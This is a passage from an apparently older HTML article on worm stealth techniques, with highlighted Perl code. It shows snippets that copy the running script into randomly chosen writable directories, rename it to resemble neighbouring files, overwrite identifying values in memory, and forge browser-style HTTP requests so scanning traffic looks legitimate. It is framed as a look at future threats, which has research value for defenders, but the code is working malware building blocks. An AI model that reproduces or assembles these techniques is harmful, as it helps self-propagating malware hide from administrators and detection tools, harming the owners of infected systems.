&nbsp; <span style="color: #cc66cc;">4</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">@self</span> <span style="color: #339933;">=</span> <span style="color: #009999;">&lt;SELF&gt;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">5</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a> <span style="color: black;">&#40;</span>SELF<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">6</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$line</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@self</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">7</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">/$rotate/</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">8</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$line</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">'$rotate = '</span> <span style="color: #339933;">.</span> <span style="color: #ff0000;">&quot;$rotreplace;<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">9</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">10</span> <span style="color: #339933;">:</span> &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #0000ff;">$line</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">11</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>To get the most out of this idea, anything hard coded would be mangled up.</p>
<p>In appendix A.2 you will see an example that does everything that A.1 does but also decodes and encrypts an array every instance of the code run. It has a number of rotations that changes as well every time the code is run. You will want to give line 37 special attention because there is a slight issue you have to think of. When a Perl program works with a string with a @ in it, sometimes it will think it is accessing an array. To prevent that, a backslash is needed. Line 37 has a solution for that issue and is fit right into the portion of the code where the lines for the next instance of the code is being prepared.</p>
<h2><a name="p4"></a>4 Roaming</h2>
<h3><a name="p41"></a>4.1 Introduction</h3>
<p>It is now clear that code can easily be manipulated so it is harder to read and different for every instance of it. In this chapter I'd like to offer a few examples showing how a worm could potentially hide itself in a file system. First by "relocating" the code into an entirely different directory and secondly by adapting the filename to the other files in the directory the code moves to.</p>
<h3><a name="p42"></a>4.2 Relocating</h3>
<p>When one wants to hide the code in the file system, that person may want to make it as random as possible. The code snippet below goes down a random amount of directories and then works it's way up a random amount of directories again. A lot of potential targets of a worm are computers that would work with permissions and as thus the attack vector may not give complete control over the system. In those instances it is important to put the relocation portion of the code within a do loop that makes sure that the new target is actually writable (see line 3 and 17).</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$traverse</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;../&quot;</span> x <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">15</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">3</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #b1b100;">do</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">4</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$tracount</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$tracount</span> <span style="color: #339933;">&lt;=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">15</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$tracount</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">5</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@listing</span> <span style="color: #339933;">=</span> <span style="color: #339933;">&lt;</span><span style="color: #0000ff;">$traverse</span><span style="color: #339933;">*&gt;;</span><br/>
&nbsp; <span style="color: #cc66cc;">6</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; <span style="color: #cc66cc;">7</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$dircount</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$entry</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@listing</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">8</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">-</span>d <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;$traverse&quot;</span> <span style="color: #339933;">.</span> <span style="color: #ff0000;">&quot;$entry&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">9</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$directory</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$dircount</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;$traverse&quot;</span> <span style="color: #339933;">.</span> <span style="color: #ff0000;">&quot;$entry/&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">10</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$dircount</span><span style="color: #339933;">++;</span><br/>
&nbsp; <span style="color: #cc66cc;">11</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">12</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> <span style="color: #0000ff;">$dircount</span><span style="color: #339933;">--;</span><br/>
&nbsp; <span style="color: #cc66cc;">13</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; <span style="color: #cc66cc;">14</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$choose</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">@directory</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">15</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$traverse</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">$directory</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$choose</span><span style="color: black;">&#93;</span> <span style="color: #b1b100;">if</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/defined.html"><span style="color: #000066;">defined</span></a> <span style="color: #0000ff;">$directory</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$choose</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">16</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">17</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span> <span style="color: #b1b100;">until</span> <span style="color: black;">&#40;</span><span style="color: #339933;">-</span>w <span style="color: #0000ff;">$traverse</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">18</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">19</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a> <span style="color: black;">&#40;</span>SELF<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&lt;$0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">20</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">@self</span> <span style="color: #339933;">=</span> <span style="color: #009999;">&lt;SELF&gt;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">21</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a> <span style="color: black;">&#40;</span>SELF<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">22</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a> <span style="color: black;">&#40;</span>NEW<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&gt;$traverse$0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">23</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> NEW <span style="color: #0000ff;">@self</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">24</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a> <span style="color: black;">&#40;</span>NEW<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">25</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;Moved to $traverse$0<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<h3><a name="p43"></a>4.3 Adapting</h3>
<p>Once a worm relocates itself to the /home/someuser for example, it will be rather obvious if the file is named dev[1-500] as was done in A.1 and A.2. If a worm were to move itself around in the file system, it would most likely adapt itself to the other files in the directory.</p>
<p>A bad solution would involve some kind of default name to revert to: In that case the worm is easy to find in virtually any operating system. When adapting a file name it is good to consider what parts of the file system the file would most likely relocate to. What if the worm is limited to files in a ftp folder with tar.gz'd files? Or .c's? Or directories with a lot of different versions of one file?</p>
<p>The following snippet of code opens the directory it is run in and takes a random file. It cuts off any extensions like .pl, .txt, etc. if present and then puts a random number and .tar.gz behind the file name.</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">@dirlisting</span> <span style="color: #339933;">=</span> <span style="color: #339933;">&lt;*&gt;;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">3</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$entrylength</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@dirlisting</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">4</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$luckyfile</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$entrylength</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">5</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$file</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">$dirlisting</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$luckyfile</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">6</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$rand</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">2</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">7</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">8</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #b1b100;">until</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$file</span> <span style="color: #339933;">!~</span> <span style="color: #009966; font-style: italic;">/\./</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$file</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">$junk</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/split.html"><span style="color: #000066;">split</span></a> <span style="color: black;">&#40;</span><span style="color: #009966; font-style: italic;">/\./</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">$file</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">9</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$file</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;$file$rand.tar.gz&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">10</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #0000ff;">$file</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>We can see that a number is added to the file name in this example. The reason a number should be added, or some other kind of change is to be made, is illustrated by the following example.</p>
<p>Say</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #0000ff;">$luckyfile</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;someprogram.tar.gz&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>and there were no lines in the code taking care of $rand. Then someprogram.tar.gz would revert to someprogram because of the until loop and then get .tar.gz again, meaning someprogram.tar.gz would either be overwritten or the worm would be unable to replicate.</p>
<p>In A.3 you will see an example that incorporates everything in this chapter with the other chapters. The add spacing code has been removed from this example to keep the code from being too repetitive.</p>
<h2><a name="p5"></a>5 Memory management</h2>
<h3><a name="p51"></a>5.1 Introduction</h3>
<p>In this chapter I would like to quickly cover cleaning out the memory from values that can be recognized by someone as being related to a specific worm. Many programs work with data that is only needed temporarily and can then be freed up/undefined to release memory for usage. The same goes counts for worms. In the future we may encounter worms that make sure no values that can indicate they are around stay in memory.</p>
<h3><a name="p52"></a>5.2 How it works</h3>
<p>In chapter 3 a easy way to hide hard coded values was shown. At one point the decoded value was assigned to memory. Hiding hard coded values will be useless to a worm writer if the values can be taken from memory. That is why we might see constructs like the following in the future.</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$code</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;Coded.by.One.Semicolon&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;normal &nbsp;- $code<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">3</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$code</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">&amp;clean</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;code&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">4</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;cleaned - $code<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">5</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/undef.html"><span style="color: #000066;">undef</span></a> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$code</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">6</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">7</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> clean <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">8</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">my</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$toclean</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@_</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">9</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$clnlength</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/length.html"><span style="color: #000066;">length</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$</span><span style="color: black;">&#123;</span><span style="color: #0000ff;">$toclean</span><span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">10</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$clncount</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$clncount</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000ff;">$clnlength</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$clncount</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">11</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$replacement</span> <span style="color: #339933;">.=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/chr.html"><span style="color: #000066;">chr</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">256</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">12</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">13</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$</span><span style="color: black;">&#123;</span><span style="color: #0000ff;">$toclean</span><span style="color: black;">&#125;</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">$replacement</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">14</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>$code has the decoded value and just the name of the variable is passed to the subroutine. The subroutine receives the name of the variable to work with and finds out how long it is. Then a replacement string is generated and then assigned.</p>
<p>This leaves the following waste: $toclean (name of the variable), $clnlength (length of the variable) and the replacement string appears in two locations ($code, $replacement).</p>
<p>In A.4 you will find a slightly larger example of this, although replacing one value with another is very straightforward.</p>
<h2><a name="p6"></a>6 Acting Normal</h2>
<h3><a name="p61"></a>6.1 Introduction</h3>
<p>When Code Red was infecting the internet, anyone with a HTTP server was getting logs full of computers that were clearly infected. Up to a point a HTTP request to a random IP address can be hidden: you will always have to try and make a connection the port involved. Verifying if a computer is vulnerable will certainly be made far more discrete when a open port has been found.</p>
<p>Worm writers have to make their code work on as many computers as possible, to be as effective as possible. Because of that, programming code would be written with basic API's, modules or whatever may be required.</p>
<p>There is no sense to write code to include a function that is only available on a small percentage of vulnerable computers. The only reason a worm writer may choose to do so after all is because it is needed as part of the exploit itself.</p>
<p>The last two paragraphs may seem to be very different subjects, but in this chapter they are combined. Using a general Perl module I would like to show a way to make a HTTP GET request look both valid and different every time such a request is made.</p>
<h3><a name="p62"></a>6.2 HTTP</h3>
<p>In this section I will offer two simple examples how a worm could disguise itself. If a worm searches for computers with a vulnerable HTTP server, one way to make the requests look like something they are not is to make it look like a normal request.</p>
<p>Obviously one would say, but it is a bit more complex than it appears. First you have to consider the things a normal browser sends. I set up a simple Perl server on port 8008 to record the request a browser makes. Below is the result I got from Internet Explorer 5.5 when requesting http://localhost:8008. See appendix B.1 for other browsers.</p>
<pre>
  GET / HTTP/1.1
  Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
  Accept-Language: en-ca
  Accept-Encoding: gzip, deflate
  User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)
  Host: localhost:8008
  Connection: Keep-Alive
</pre>
<p>There is quite a bit of information that a browser sends out before receiving anything. You can see that the Accept-Language it set to Canada. An interesting thing to notice is that my test setup was running Windows ME and not Windows 98 as claimed in the User-Agent field.</p>
<p>In the following example IO::Socket is used to make a simple connection and get the main page of a web site. Usage: Perl example.pl www.server.com 80.</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">use</span> IO<span style="color: #339933;">::</span><span style="color: #006600;">Socket</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">3</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$remote</span> <span style="color: #339933;">=</span> IO<span style="color: #339933;">::</span><span style="color: #006600;">Socket</span><span style="color: #339933;">::</span><span style="color: #006600;">INET</span><span style="color: #339933;">-&gt;</span><span style="color: #000000; font-weight: bold;">new</span> <span style="color: black;">&#40;</span><br/>
&nbsp; <span style="color: #cc66cc;">4</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; PeerAddr <span style="color: #339933;">=&gt;</span> <span style="color: #ff0000;">&quot;$ARGV[0]&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">5</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; PeerPort <span style="color: #339933;">=&gt;</span> <span style="color: #ff0000;">&quot;$ARGV[1]&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">6</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; Proto &nbsp; &nbsp;<span style="color: #339933;">=&gt;</span> <span style="color: #ff0000;">&quot;tcp&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">7</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#41;</span> <span style="color: #339933;">||</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/die.html"><span style="color: #000066;">die</span></a> <span style="color: #ff0000;">&quot;trying&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">8</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">9</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #0000ff;">$remote</span> <span style="color: #ff0000;">&quot;GET / HTTP/1.0<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">10</span> <span style="color: #339933;">:</span> <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span> <span style="color: #339933;">&lt;</span><span style="color: #0000ff;">$remote</span><span style="color: #339933;">&gt;</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>"GET / HTTP/1.0" does not look like a very normal browser request. In the following example a request for a website in the style that Netscape 4.73 would make one is duplicated. You will find that the connection stays open because of the "Connection: Keep-Alive" line that Netscape 4.73 sends in a GET request.</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">use</span> IO<span style="color: #339933;">::</span><span style="color: #006600;">Socket</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">3</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$remote</span> <span style="color: #339933;">=</span> IO<span style="color: #339933;">::</span><span style="color: #006600;">Socket</span><span style="color: #339933;">::</span><span style="color: #006600;">INET</span><span style="color: #339933;">-&gt;</span><span style="color: #000000; font-weight: bold;">new</span> <span style="color: black;">&#40;</span><br/>
&nbsp; <span style="color: #cc66cc;">4</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; PeerAddr <span style="color: #339933;">=&gt;</span> <span style="color: #ff0000;">&quot;$ARGV[0]&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">5</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; PeerPort <span style="color: #339933;">=&gt;</span> <span style="color: #ff0000;">&quot;$ARGV[1]&quot;</span><span style="color: #339933;">,</span><br/>
